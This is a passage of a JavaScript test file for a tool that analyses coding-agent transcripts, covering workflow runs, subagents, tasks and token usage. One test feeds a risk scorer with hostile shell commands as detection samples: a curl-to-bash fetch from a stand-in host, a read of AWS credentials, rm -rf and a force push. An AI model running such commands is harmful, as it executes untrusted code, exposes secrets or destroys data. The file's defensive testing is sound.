  assert.equal(byTool('Agent').target, 'audit deps');
  assert.equal(byTool('Agent').detail, 'Explore');
  assert.match(byTool('TodoWrite').target, /ship it/, 'todo target surfaces the in-progress item');

  // result folding (ok / isError from the correlated tool_result)
  assert.equal(byTool('Read').ok, true);
  assert.equal(byTool('Grep').ok, false);
  assert.equal(byTool('Grep').isError, true, 'an errored tool_result folds onto its action');

  // reasoning carry-forward (same-message text, and a thinking-only preceding message)
  assert.equal(byTool('Read').reasoning, 'Exploring the code.');
  assert.equal(byTool('Bash').reasoning, 'Now run checks.', 'thinking-only message carries forward to the next call');

  // edit linking: Write -> store #1, Edit -> store #2 (positional per file); Bash is not edit-linked
  assert.equal(byTool('Write').editId, 1, 'Write links to store edit #1');
  assert.equal(byTool('Edit').editId, 2, 'Edit links to store edit #2');
  assert.equal(byTool('Bash').editId, undefined, 'a Bash action carries no single editId');

  // chronological + summary
  assert.ok(acts[0].ts > 0 && acts[0].ts <= acts[acts.length - 1].ts, 'actions are in chronological order with parsed timestamps');
  const sum = core.summarizeActions(acts);
  assert.equal(sum.total, 8);
  assert.equal(sum.errors, 1);
  assert.equal(sum.byCategory.edit, 2);
});

test('actions: silent when there is no transcript', () => {
  freshHome();
  assert.deepEqual(core.parseActions(tmpWork(), 'nope'), [], 'no transcript -> no actions');
});

test('actions: buildActionGroups groups by category, curated by default (errors always surface)', () => {
  const acts = [
    { category: 'edit', tool: 'Edit', isError: false }, { category: 'edit', tool: 'Write', isError: false },
    { category: 'exec', tool: 'Bash', isError: false },
    { category: 'read', tool: 'Read', isError: false }, { category: 'read', tool: 'Read', isError: true }, // one errored read
    { category: 'search', tool: 'Grep', isError: false },
    { category: 'meta', tool: 'Skill', isError: false },
    { category: 'web', tool: 'WebFetch', isError: false },
  ];
  const curated = core.buildActionGroups(acts);
  const cats = curated.map((g) => g.category);
  assert.ok(cats.includes('edit') && cats.includes('exec') && cats.includes('web'), 'curated categories shown');
  assert.ok(!cats.includes('search') && !cats.includes('meta'), 'noisy no-error categories hidden by default');
  const read = curated.find((g) => g.category === 'read');
  assert.ok(read, 'a read WITH an error still surfaces in curated mode');
  assert.equal(read.count, 2, 'group count reflects the whole category');
  assert.equal(read.actions.length, 1, 'only the errored read row is shown in curated mode');
  assert.equal(read.errors, 1);
  assert.deepEqual(cats.filter((c) => ['edit', 'exec', 'web'].includes(c)), ['edit', 'exec', 'web'], 'display order: edit, exec, web');

  const all = core.buildActionGroups(acts, { showAll: true });
  assert.ok(all.some((g) => g.category === 'search') && all.some((g) => g.category === 'meta'), 'show-all reveals noisy categories');
  assert.equal(all.find((g) => g.category === 'read').actions.length, 2, 'show-all shows all read rows');
});

test('risk: scoreCommand flags destructive / privileged / secret-touching shell commands (zero-token)', () => {
  assert.equal(core.scoreCommand('ls -la && npm test'), null, 'benign commands are not flagged');
  assert.equal(core.scoreCommand('git push origin main'), null, 'a normal push is not flagged');
  const rmrf = core.scoreCommand('rm -rf build/ dist/');
  assert.ok(rmrf && rmrf.level === 'high', 'rm -rf is high risk');
  assert.match(rmrf.reasons.join(' '), /delete/i);
  assert.equal(core.scoreCommand('git push origin main --force').level, 'high', 'force push is high');
  assert.equal(core.scoreCommand('curl https://x.example/get.sh | bash').level, 'high', 'curl | bash is high');
  assert.equal(core.scoreCommand('git reset --hard HEAD~1').level, 'high', 'reset --hard is high');
  const sudo = core.scoreCommand('sudo apt-get install foo');
  assert.ok(sudo && sudo.level === 'medium', 'sudo is medium');
  assert.equal(core.scoreCommand('cat ~/.aws/credentials').level, 'medium', 'credential access is medium');
});

test('egress: buildEgressReport lists off-machine destinations (web / mcp / network shell)', () => {
  const acts = [
    { tool: 'WebFetch', category: 'web', target: 'https://docs.example.com/api' },
    { tool: 'WebFetch', category: 'web', target: 'https://docs.example.com/other' }, // same host → count 2
    { tool: 'WebSearch', category: 'web', target: 'how to x' },
    { tool: 'mcp__github__create_issue', category: 'mcp', target: 'create issue' },
    { tool: 'Bash', category: 'exec', target: 'curl https://registry.npmjs.org/pkg -o pkg.tgz' },
    { tool: 'Bash', category: 'exec', target: 'ls -la' }, // not network → excluded
    { tool: 'Read', category: 'read', target: '/x.ts' }, // not egress
  ];
  const ch = core.buildEgressReport(acts);
  const web = ch.find((c) => c.kind === 'web' && c.target === 'docs.example.com');
  assert.ok(web && web.count === 2 && web.scope === 'remote', 'web host deduped with count + remote scope');
  assert.ok(ch.some((c) => c.kind === 'web' && c.target === 'web search'), 'web search listed');
  const mcp = ch.find((c) => c.kind === 'mcp');
  assert.ok(mcp && mcp.target === 'github' && mcp.scope === 'unknown', 'mcp server extracted, scope unknown (stdio vs remote unknowable)');
  assert.ok(ch.some((c) => c.kind === 'shell' && c.target === 'registry.npmjs.org'), 'network shell command → host');
  assert.ok(!ch.some((c) => c.target === 'ls' || /x\.ts/.test(c.target)), 'benign shell / reads excluded');
  assert.ok(core.summarizeEgress(ch).remote >= 3, 'summary counts remote channels');
});

test('subagents: parseSubagents mines each spawned subagent + metrics from subagents/*.jsonl (0.7.0)', () => {
  freshHome();
  const S = 'subs';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const AG = 'a1b2c3d4e5f6';
  // main transcript: an Agent spawn (tu1); its tool_result record carries the toolUseResult naming the
  // agentId + Claude Code's per-subagent metrics (duration / tokens / tool-use count).
  const main = [
    { timestamp: '2026-07-13T10:00:00.000Z', message: { role: 'assistant', content: [
      { type: 'tool_use', id: 'tu1', name: 'Agent', input: { description: 'review the diff', subagent_type: 'code-reviewer' } },
    ] } },
    { timestamp: '2026-07-13T10:05:00.000Z',
      toolUseResult: { status: 'completed', agentId: AG, agentType: 'code-reviewer', totalDurationMs: 300000, totalTokens: 45000, totalToolUseCount: 12 },
      message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'tu1', is_error: false, content: 'done' }] } },
  ].map((o) => JSON.stringify(o)).join('\n');
  fs.writeFileSync(path.join(proj, S + '.jsonl'), main);
  // the subagent's own transcript (all isSidechain) — its tool calls live here, not in the main file.
  const subDir = path.join(proj, S, 'subagents');
  fs.mkdirSync(subDir, { recursive: true });
  const subtx = [
    { isSidechain: true, agentId: AG, sessionId: S, timestamp: '2026-07-13T10:01:00.000Z', message: { role: 'assistant', content: [
      { type: 'tool_use', id: 'st1', name: 'Read', input: { file_path: '/x.ts' } },
      { type: 'tool_use', id: 'st2', name: 'Grep', input: { pattern: 'foo' } },
    ] } },
    { isSidechain: true, message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'st2', is_error: true }] } },
    { isSidechain: true, timestamp: '2026-07-13T10:02:00.000Z', message: { role: 'assistant', content: [
      { type: 'tool_use', id: 'st3', name: 'Edit', input: { file_path: '/x.ts' } },
    ] } },
  ].map((o) => JSON.stringify(o)).join('\n');
  fs.writeFileSync(path.join(subDir, `agent-${AG}.jsonl`), subtx);

  const subs = core.parseSubagents(cwd, S);
  assert.equal(subs.length, 1, 'one subagent found');
  const s = subs[0];
  assert.equal(s.agentId, AG);
  assert.equal(s.agentType, 'code-reviewer', 'agentType from toolUseResult');
  assert.equal(s.description, 'review the diff', 'description correlated from the spawn input');
  assert.equal(s.status, 'completed');
  assert.equal(s.durationMs, 300000, 'duration from toolUseResult');
  assert.equal(s.tokens, 45000);
  assert.equal(s.toolUseCount, 12);
  assert.equal(s.actions.length, 3, "subagent's own tool calls parsed (sidechain kept for its OWN file)");
  assert.equal(s.edits, 1, 'one edit action attributed to the subagent');
  assert.equal(s.summary.errors, 1, 'the errored grep folds onto the subagent summary');
  const rollup = core.summarizeSubagents(subs);
  assert.deepEqual(
    [rollup.count, rollup.totalActions, rollup.totalEdits, rollup.totalDurationMs, rollup.totalTokens, rollup.errors],
    [1, 3, 1, 300000, 45000, 1]
  );
  // The main transcript's Agent spawn is NOT double-counted as a subagent action.
  assert.ok(core.parseActions(cwd, S).every((a) => a.tool !== 'Read'), "subagent's Read stays out of the main action timeline");
});

test('workflows: an agent row carries its EFFORT beside its model, and never guesses one', () => {
  // The Workflows view showed "Opus 5 · 112k tok · 10m · 0 edits" — the model but not the reasoning
  // effort, which is the other half of "what did this agent run on". The effort rides the RECORD
  // (`o.effort`), not `o.message`, which is the same place metrics.ts reads it.
  freshHome();
  const S = 'wf-effort';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  fs.writeFileSync(path.join(proj, S + '.jsonl'), '');
  const wfDir = path.join(proj, S, 'subagents', 'workflows', 'wf_eff');
  fs.mkdirSync(wfDir, { recursive: true });
  const t0 = Date.now() - 60_000;
  const rec = (effort, i) => JSON.stringify({
    timestamp: new Date(t0 + i * 1000).toISOString(),
    type: 'assistant',
    ...(effort ? { effort } : {}),
    message: { role: 'assistant', id: 'm' + i, model: 'claude-opus-5', usage: { input_tokens: 10, output_tokens: 5 }, content: [] },
  });
  // Two agents at DIFFERENT efforts, and a third that never declares one.
  fs.writeFileSync(path.join(wfDir, 'agent-aaa.jsonl'), [rec('max', 1), rec('max', 2)].join('\n') + '\n');
  fs.writeFileSync(path.join(wfDir, 'agent-bbb.jsonl'), [rec('xhigh', 1)].join('\n') + '\n');
  fs.writeFileSync(path.join(wfDir, 'agent-ccc.jsonl'), [rec(null, 1)].join('\n') + '\n');

  const runs = core.parseWorkflows(cwd, S);
  assert.equal(runs.length, 1, 'one run');
  const efforts = runs[0].agents.map((a) => a.effort).sort();
  assert.deepEqual(efforts, ['', 'max', 'xhigh'],
    'each agent reports its OWN effort — not the run\'s, and not a default');
  assert.ok(runs[0].agents.every((a) => a.model === 'Opus 5'), 'the model still resolves beside it');
  // The absent one is EMPTY, never a guess: the default effort differs by build and by model, so a
  // placeholder here would be fiction the renderer would present as fact.
  assert.equal(runs[0].agents.find((a) => a.effort === '').model, 'Opus 5',
    'an agent with no declared effort still reports its model');
});

test('workflows: parseWorkflows aggregates a run — name/phases from the script, per-agent + summed tokens/time/edits, running flag (0.8.0) [journal/script FALLBACK: no state file]', () => {
  freshHome();
  const S = 'wf';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  fs.writeFileSync(path.join(proj, S + '.jsonl'), ''); // main transcript must exist (findTranscript/findSubagentsDir)
  const wfDir = path.join(proj, S, 'subagents', 'workflows', 'wf_test123');
  fs.mkdirSync(wfDir, { recursive: true });
  // The script that names the run — name/description/phases parsed from `export const meta` WITHOUT executing it.
  const scriptsDir = path.join(proj, S, 'workflows', 'scripts');
  fs.mkdirSync(scriptsDir, { recursive: true });
  fs.writeFileSync(
    path.join(scriptsDir, 'demo-flow-wf_test123.js'),
    "export const meta = {\n  name: 'Demo Flow',\n  description: 'A demo workflow',\n  phases: [{ title: 'Plan' }, { title: 'Build' }],\n}\n"
  );
  // journal: two agents started; only agent A got a result (agent B is still running).
  fs.writeFileSync(
    path.join(wfDir, 'journal.jsonl'),
    [
      { type: 'started', key: 'phase-plan', agentId: 'a1111111' },
      { type: 'started', key: 'phase-build', agentId: 'b2222222' },
      { type: 'result', key: 'phase-plan', agentId: 'a1111111', result: { ok: true } },
    ]
      .map((o) => JSON.stringify(o))
      .join('\n')
  );
  // Agent A transcript: two assistant turns (60s apart) → 400 tok, 60000ms; one Edit adding a line (+1/-0).
  fs.writeFileSync(
    path.join(wfDir, 'agent-a1111111.jsonl'),
    [
      { timestamp: '2026-07-15T10:00:00.000Z', message: { role: 'assistant', id: 'mA1', usage: { input_tokens: 100, cache_read_input_tokens: 0, cache_creation_input_tokens: 0, output_tokens: 200 }, content: [{ type: 'tool_use', id: 'e1', name: 'Edit', input: { file_path: '/f.ts', old_string: 'line1\nline2\n', new_string: 'line1\nline2\nline3\n' } }] } },
      { message: { role: 'user', content: [{ type: 'tool_result', tool_use_id: 'e1', is_error: false }] } },
      { timestamp: '2026-07-15T10:01:00.000Z', message: { role: 'assistant', id: 'mA2', usage: { input_tokens: 50, cache_read_input_tokens: 0, cache_creation_input_tokens: 0, output_tokens: 50 }, content: [{ type: 'text', text: 'done' }] } },
    ]
      .map((o) => JSON.stringify(o))
      .join('\n')
  );
  fs.writeFileSync(path.join(wfDir, 'agent-a1111111.meta.json'), JSON.stringify({ agentType: 'workflow-subagent', spawnDepth: 1 }));
  // Agent B transcript: a single Read turn → 50 tok, 0ms, no edits.
  fs.writeFileSync(
    path.join(wfDir, 'agent-b2222222.jsonl'),
    JSON.stringify({ timestamp: '2026-07-15T10:00:30.000Z', message: { role: 'assistant', id: 'mB1', usage: { input_tokens: 20, cache_read_input_tokens: 0, cache_creation_input_tokens: 0, output_tokens: 30 }, content: [{ type: 'tool_use', id: 'r1', name: 'Read', input: { file_path: '/g.ts' } }] } })
  );
  fs.writeFileSync(path.join(wfDir, 'agent-b2222222.meta.json'), JSON.stringify({ agentType: 'workflow-subagent', spawnDepth: 1 }));

  const runs = core.parseWorkflows(cwd, S);
  assert.equal(runs.length, 1, 'one workflow run');
  const w = runs[0];
  assert.equal(w.id, 'wf_test123');
  assert.equal(w.name, 'Demo Flow', 'name from meta.name');
  assert.equal(w.description, 'A demo workflow', 'description from meta');
  assert.deepEqual(w.phases, ['Plan', 'Build'], 'phase titles from meta.phases');
  assert.equal(w.agentCount, 2);
  // Summed per-workflow — the user asked explicitly for tokens + time + edits.
  assert.equal(w.tokens, 450, 'Σtokens = 400 + 50');
  assert.equal(w.durationMs, 60000, 'Σtime = 60000 + 0');
  assert.equal(w.edits, 1, 'Σedits = 1 + 0');
  assert.equal(w.added, 1, 'Σadded from the agents own Edit inputs');
  assert.equal(w.removed, 0);
  assert.equal(w.running, true, 'agent B is started-without-result and the run is fresh');
  // Fallback phaseGroups group by the journal key (no real phase names without the state file), in agent order.
  assert.deepEqual(
    w.phaseGroups,
    [{ title: 'phase-plan', done: 1, total: 1 }, { title: 'phase-build', done: 0, total: 1 }],
    'fallback phaseGroups group agents by the journal key, per-phase done/total'
  );

  const a = w.agents.find((x) => x.agentId === 'a1111111');
  assert.deepEqual([a.tokens, a.durationMs, a.edits, a.added, a.removed], [400, 60000, 1, 1, 0], 'agent A per-agent metrics');
  assert.equal(a.done, true, 'agent A got a journal result');
  assert.equal(a.phase, 'phase-plan', "agent phase = the journal key that grouped it");
  assert.equal(a.label, null, 'no per-agent label in the journal fallback');
  assert.equal(a.agentType, 'workflow-subagent', 'agentType from the sidecar');
  const b = w.agents.find((x) => x.agentId === 'b2222222');
  assert.deepEqual([b.tokens, b.durationMs, b.edits], [50, 0, 0], 'agent B per-agent metrics');
  assert.equal(b.done, false, 'agent B has no result yet');
  assert.equal(b.phase, 'phase-build');
});

test('workflows: a RUNNING run whose journal keys are per-agent HASHES shows NO bogus phase groups (0.8.0)', () => {
  // Regression: newer workflow runtimes write the journal `key` as a per-agent content hash ("v2:<hex>")
  // — NOT a phase — and the rich state file (with real labels/phases) only appears at completion. The
  // fallback must NOT turn each hash into its own "phase", else the UI shows "v2:<hash> 0/1" rows.
  freshHome();
  const S = 'wfhash';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  fs.writeFileSync(path.join(proj, S + '.jsonl'), '');
  const wfDir = path.join(proj, S, 'subagents', 'workflows', 'wf_hash1');
  fs.mkdirSync(wfDir, { recursive: true });
  const H1 = 'v2:dd396d39b36879c0a47ed0381448112552c76a5b6811aac8f71e44fa30f60a66';
  const H2 = 'v2:500cbad28997de976a1956a41becf4513d2c792dabd98109340e8ef71e87face';
  fs.writeFileSync(
    path.join(wfDir, 'journal.jsonl'),
    [
      { type: 'started', key: H1, agentId: 'aca9b4b71e422a493' },
      { type: 'started', key: H2, agentId: 'aac152dc04db93ad1' },
    ].map((o) => JSON.stringify(o)).join('\n')
  );
  for (const id of ['aca9b4b71e422a493', 'aac152dc04db93ad1']) {
    fs.writeFileSync(
      path.join(wfDir, `agent-${id}.jsonl`),
      JSON.stringify({ timestamp: '2026-07-15T10:00:00.000Z', message: { role: 'assistant', id: 'm' + id, usage: { input_tokens: 10, output_tokens: 10 }, content: [{ type: 'text', text: 'working' }] } })
    );
    fs.writeFileSync(path.join(wfDir, `agent-${id}.meta.json`), JSON.stringify({ agentType: 'general-purpose', spawnDepth: 1 }));
  }
  const w = core.parseWorkflows(cwd, S)[0];
  assert.equal(w.agentCount, 2);
  assert.deepEqual(w.phaseGroups, [], 'a hash journal key is NOT a phase — no phase groups until the state file lands');
  for (const a of w.agents) {
    assert.equal(a.phase, null, 'agent phase is null (the hash key is ignored, not used as a phase)');
    assert.equal(a.label, null, 'no label derivable (assistant-only transcript — a prompt line is required)');
    assert.equal(a.labelDerived, false, 'labelDerived stays false when nothing was derived');
    assert.equal(a.agentType, 'general-purpose', 'agentType still read from the sidecar');
  }
});

test('tasks: readSessionTasks reads the session task dir (numeric order, malformed skipped, unsafe id refused) + summarizeTasks counts (0.8.3)', () => {
  const home = freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'task-sess-1';
  const dir = path.join(home, '.claude', 'tasks', S);
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, '2.json'), JSON.stringify({ id: '2', subject: 'Ship it', status: 'in_progress', activeForm: 'Shipping', blocks: [], blockedBy: ['1'] }));
  fs.writeFileSync(path.join(dir, '10.json'), JSON.stringify({ id: '10', subject: 'Follow-up', status: 'pending' }));
  fs.writeFileSync(path.join(dir, '1.json'), JSON.stringify({ id: '1', subject: 'Build it', status: 'completed' }));
  fs.writeFileSync(path.join(dir, '3.json'), '{not json'); // one bad write must not blank the tab
  fs.writeFileSync(path.join(dir, 'notes.txt'), 'ignored'); // only <digits>.json are tasks
  const ts = core.readSessionTasks(S);
  assert.deepEqual(ts.map((t) => t.id), ['1', '2', '10'], 'numeric id order (not lexicographic), malformed + non-task files skipped');
  assert.equal(ts[1].activeForm, 'Shipping');
  assert.deepEqual(ts[1].blockedBy, ['1']);
  assert.equal(ts[2].activeForm, null, 'absent activeForm → null');
  assert.deepEqual(core.summarizeTasks(ts), { total: 3, completed: 1, inProgress: 1, pending: 1 });
  assert.deepEqual(core.readSessionTasks('../escape'), [], 'a path-shaped session id is refused, not joined');
  assert.deepEqual(core.readSessionTasks('no-such-session'), [], 'missing dir → [] (session never used tasks)');
});

test('workflows: LIVE runs derive per-agent labels from the first distinguishing prompt line (hash-key journal, no state file) — marked labelDerived (0.8.1)', () => {
  // Newer runtimes journal only {type, key: "v2:<hash>", agentId} — no label/phaseTitle — so a running
  // fan-out used to render as "workflow-subagent <id>" rows. The agents' prompts share their preamble
  // and diverge at the task line: that first unique line IS the live label (heuristic, hence the flag).
  freshHome();
  const S = 'wflive';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  fs.writeFileSync(path.join(proj, S + '.jsonl'), '');
  const wfDir = path.join(proj, S, 'subagents', 'workflows', 'wf_live1');
  fs.mkdirSync(wfDir, { recursive: true });
  const PREAMBLE = 'Repo rules: do not commit, do not touch git — shared preamble every sibling carries.';
  const agents = [
    { id: 'a111aaaaaaaaaaaaa', task: 'Your job: convert the core demo simulator to the Python canon.' },
    { id: 'a222bbbbbbbbbbbbb', task: 'Your job: convert README.md and docs/DEMO.md to the Python canon.' },
  ];
  fs.writeFileSync(
    path.join(wfDir, 'journal.jsonl'),
    agents.map((a, i) => JSON.stringify({ type: 'started', key: `v2:${String(i).repeat(64)}`, agentId: a.id })).join('\n')
  );
  for (const a of agents) {
    fs.writeFileSync(
      path.join(wfDir, `agent-${a.id}.jsonl`),
      [
        { type: 'user', timestamp: '2026-07-16T10:00:00.000Z', message: { role: 'user', content: PREAMBLE + '\n\n' + a.task } },
        { timestamp: '2026-07-16T10:00:05.000Z', message: { role: 'assistant', id: 'm' + a.id, usage: { input_tokens: 10, output_tokens: 10 }, content: [{ type: 'text', text: 'starting the conversion' }] } },
      ].map((o) => JSON.stringify(o)).join('\n')
    );
    fs.writeFileSync(path.join(wfDir, `agent-${a.id}.meta.json`), JSON.stringify({ agentType: 'workflow-subagent', spawnDepth: 1 }));
  }
  // A third sibling whose prompt is ONLY the shared preamble: no distinguishing line exists, so NO label
  // may be derived (three identical labels would be worse than the agentType + id fallback rows).
  fs.appendFileSync(
    path.join(wfDir, 'journal.jsonl'),
    '\n' + JSON.stringify({ type: 'started', key: 'v2:' + 'c'.repeat(64), agentId: 'a333ccccccccccccc' })
  );
  fs.writeFileSync(
    path.join(wfDir, `agent-a333ccccccccccccc.jsonl`),
    JSON.stringify({ type: 'user', timestamp: '2026-07-16T10:00:00.000Z', message: { role: 'user', content: PREAMBLE } })
  );
  fs.writeFileSync(path.join(wfDir, `agent-a333ccccccccccccc.meta.json`), JSON.stringify({ agentType: 'workflow-subagent', spawnDepth: 1 }));
  const w = core.parseWorkflows(cwd, S)[0];
  const byId = new Map(w.agents.map((a) => [a.agentId, a]));
  assert.equal(byId.get('a111aaaaaaaaaaaaa').label, 'Your job: convert the core demo simulator to the Python canon.', 'label = the first prompt line unique to the agent (the shared preamble is skipped)');
  assert.equal(byId.get('a222bbbbbbbbbbbbb').label, 'Your job: convert README.md and docs/DEMO.md to the Python canon.');
  assert.equal(byId.get('a111aaaaaaaaaaaaa').labelDerived, true, 'derived labels are flagged so renderers mark them (~), never assert them');
  assert.equal(byId.get('a222bbbbbbbbbbbbb').labelDerived, true);
  assert.equal(byId.get('a333ccccccccccccc').label, null, 'all-shared prompt → no derived label (agentType + id beats identical labels)');
  assert.equal(byId.get('a333ccccccccccccc').labelDerived, false);
});

test('metrics: sessionUsage sums main-chain tokens (deduped by message id, sidechain excluded) + transcript wall-clock (0.8.0 r3 — the per-sibling Fleet metric)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'usageSess';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const T0 = '2026-07-15T10:00:00.000Z';
  const T1 = '2026-07-15T10:05:00.000Z';
  fs.writeFileSync(
    path.join(proj, S + '.jsonl'),
    [
      { type: 'user', timestamp: T0, message: { role: 'user', content: 'go' } },
      { timestamp: T0, message: { role: 'assistant', id: 'm1', usage: { input_tokens: 100, cache_read_input_tokens: 40000, cache_creation_input_tokens: 9000, output_tokens: 200 }, content: [{ type: 'thinking', thinking: 'x' }] } },
      // Same message.id, second block of the SAME turn — its usage must be counted once, not doubled.
      { timestamp: T0, message: { role: 'assistant', id: 'm1', usage: { input_tokens: 100, cache_read_input_tokens: 40000, cache_creation_input_tokens: 9000, output_tokens: 200 }, content: [{ type: 'text', text: 'hi' }] } },
      { timestamp: T1, message: { role: 'assistant', id: 'm2', usage: { input_tokens: 50, output_tokens: 50 }, content: [] } },
      // A sidechain (subagent) turn — huge usage that must NOT swamp the main-chain total.
      { timestamp: T1, isSidechain: true, message: { role: 'assistant', id: 'sc', usage: { input_tokens: 999999, output_tokens: 999999 }, content: [] } },
    ].map((o) => JSON.stringify(o)).join('\n')
  );
  const u = core.sessionUsage(cwd, S);
  // `total` is tokens PROCESSED ONCE: input + output + cacheCreation. It excludes exactly one
  // counter — `cacheRead`, the prompt read back every turn, which made the same context count once
  // per turn (98.8% of the old blended figure). cacheCreation IS counted: those tokens were really
  // processed, just written to cache. This definition is chosen to AGREE with Claude Code's own
  // display for the same run, because two tools disagreeing about one number is worse than either
  // being slightly off.
  assert.equal(u.total, 9400, 'Σ = input(100+50) + output(200+50) + cacheCreation(9000)');
  assert.ok(u.total < u.cacheRead, 'the headline is no longer dominated by re-read context');
  assert.equal(u.total + u.cacheRead, 49400, 'and it still reconciles with the old blended figure');
  assert.equal(u.input, 150, 'uncached input split out (100 + 50)');
  assert.equal(u.output, 250, 'output split out (200 + 50)');
  assert.equal(u.cacheRead, 40000, 'cache reads split out');
  assert.equal(u.cacheCreation, 9000, 'cache writes split out');
  assert.equal(Math.round(u.hitPct), 81, 'hit rate = 40000 / (150+40000+9000) ≈ 81%');
  assert.equal(u.durationMs, 300000, 'wall-clock = T1 − T0 (5 min)');
  assert.deepEqual(
    core.sessionUsage(cwd, 'missing'),
    { total: 0, input: 0, output: 0, cacheRead: 0, cacheCreation: 0, hitPct: null, durationMs: 0 },
    'absent transcript → zeros (hitPct null, not a fake 0%), never throws'
  );
});

test('metrics: sessionUsage cursor — appends parse incrementally, a pending tail line counts once, a shrink rescans (0.8.6)', () => {
  freshHome();
  delete process.env.CLAUDE_CONFIG_DIR;
  const S = 'usageCursor';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  const file = path.join(proj, S + '.jsonl');
  const line = (id, usage, ts) =>
    JSON.stringify({ timestamp: ts, message: { role: 'assistant', id, usage, content: [] } });
  const T0 = '2026-07-15T10:00:00.000Z';
  const T1 = '2026-07-15T10:05:00.000Z';

  fs.writeFileSync(file, line('m1', { input_tokens: 10, output_tokens: 20, cache_read_input_tokens: 30, cache_creation_input_tokens: 40 }, T0) + '\n');
  let u = core.sessionUsage(cwd, S);
  assert.deepEqual([u.input, u.output, u.cacheRead, u.cacheCreation], [10, 20, 30, 40], 'first scan');

  // Append half a line (no newline): a mid-write record must not count or corrupt the totals.
  const m2 = line('m2', { input_tokens: 1, output_tokens: 2 }, T1);
  fs.appendFileSync(file, m2.slice(0, 25));
  u = core.sessionUsage(cwd, S);
  assert.equal(u.input, 10, 'partial (unparseable) tail line is not counted yet');

  // Complete it — still without a trailing newline: a complete-but-unterminated tail counts (peek)…
  fs.appendFileSync(file, m2.slice(25));
  u = core.sessionUsage(cwd, S);
  assert.equal(u.input, 11, 'complete-but-unterminated tail line counts');
  assert.equal(u.durationMs, 300000, 'peeked tail extends the wall-clock');

  // …and exactly once after its newline lands and the cursor folds it in.
  fs.appendFileSync(file, '\n');
  u = core.sessionUsage(cwd, S);
  assert.deepEqual([u.input, u.output], [11, 22], 'tail folded into the cursor once, never doubled');

  // A same-id line arriving in a LATER append is still deduped — `seen` persists across deltas.
  fs.appendFileSync(file, line('m2', { input_tokens: 1, output_tokens: 2 }, T1) + '\n');
  u = core.sessionUsage(cwd, S);
  assert.deepEqual([u.input, u.output], [11, 22], 'duplicate message id across appends counted once');

  // Unchanged file: the repeat call is a pure stat() hit with identical results.
  assert.deepEqual(core.sessionUsage(cwd, S), u, 'no-change call returns the same totals');

  // Shrink (transcript replaced): the stale cursor is discarded and the file rescans from byte 0.
  fs.writeFileSync(file, line('m9', { input_tokens: 5, output_tokens: 6 }, T0) + '\n');
  u = core.sessionUsage(cwd, S);
  assert.deepEqual([u.input, u.output, u.cacheRead], [5, 6, 0], 'shrunken file rescanned from scratch');
});

test('workflows: parseWorkflows reads the rich state file as PRIMARY — informative name/summary, real phaseTitles, per-agent label/phase, state-preferred tokens/time + transcript edits, phaseGroups (0.8.0 r2)', () => {
  freshHome();
  const S = 'wfstate';
  const cwd = tmpWork();
  const proj = core.projectDir(cwd);
  fs.mkdirSync(proj, { recursive: true });
  fs.writeFileSync(path.join(proj, S + '.jsonl'), ''); // main transcript must exist (findTranscript/findSubagentsDir)
  const sessDir = path.join(proj, S);
  const wfDir = path.join(sessDir, 'subagents', 'workflows', 'wf_rich'); // transcripts live under subagents/ (for edits)
  fs.mkdirSync(wfDir, { recursive: true });
  // The rich per-run state file — SIBLING of subagents/ — is the PRIMARY source (no script needed).
  const stateDir = path.join(sessDir, 'workflows');
  fs.mkdirSync(stateDir, { recursive: true });
  fs.writeFileSync(
    path.join(stateDir, 'wf_rich.json'),
    JSON.stringify({
      workflowName: 'Editors R2',
      summary: 'Ship the round-2 editor upgrade across both IDEs',
      phases: [{ title: 'Implement', detail: 'code + model' }, { title: 'Verify', detail: 'build + tests' }],
      workflowProgress: [
        { type: 'workflow_phase', index: 0, title: 'Implement' },
        { type: 'workflow_agent', label: 'S11-vscode', phaseTitle: 'Implement', phaseIndex: 0, agentId: 'imp1', tokens: 500, toolCalls: 10, state: 'completed', durationMs: 30000 },
        { type: 'workflow_agent', label: 'S12-jetbrains', phaseTitle: 'Implement', phaseIndex: 0, agentId: 'imp2', tokens: 300, toolCalls: 5, state: 'completed', durationMs: 20000 },
        { type: 'workflow_phase', index: 1, title: 'Verify' },
        { type: 'workflow_agent', label: 'S21-vscode', phaseTitle: 'Verify', phaseIndex: 1, agentId: 'ver1', tokens: 200, toolCalls: 3, state: 'completed', durationMs: 10000 },
        { type: 'workflow_agent', label: 'S22-jetbrains', phaseTitle: 'Verify', phaseIndex: 1, agentId: 'ver2', tokens: 100, toolCalls: 2, state: 'running' },
      ],
      totalTokens: 1100,
      totalToolCalls: 20,
      durationMs: 45000,
      status: 'running',
      startTime: '2026-07-15T12:00:00.000Z',
      agentCount: 4,
    })
  );
  // Per-agent transcripts carry the EDITS (never in the state file); their usage DIFFERS from the state
  // tokens so we can prove the state file wins. imp1 edits +1, imp2 +1, ver1 none, ver2 +1/-1.
  fs.writeFileSync(
    path.join(wfDir, 'agent-imp1.jsonl'),
    JSON.stringify({ timestamp: '2026-07-15T12:00:00.000Z', message: { role: 'assistant', id: 'i1', usage: { input_tokens: 900, cache_read_input_tokens: 0, cache_creation_input_tokens: 0, output_tokens: 99 }, content: [{ type: 'tool_use', id: 'ie1', name: 'Edit', input: { file_path: '/a.ts', old_string: 'a\n', new_string: 'a\nb\n' } }] } })
  );
  fs.writeFileSync(path.join(wfDir, 'agent-imp1.meta.json'), JSON.stringify({ agentType: 'workflow-subagent', spawnDepth: 1 }));
  fs.writeFileSync(
    path.join(wfDir, 'agent-imp2.jsonl'),
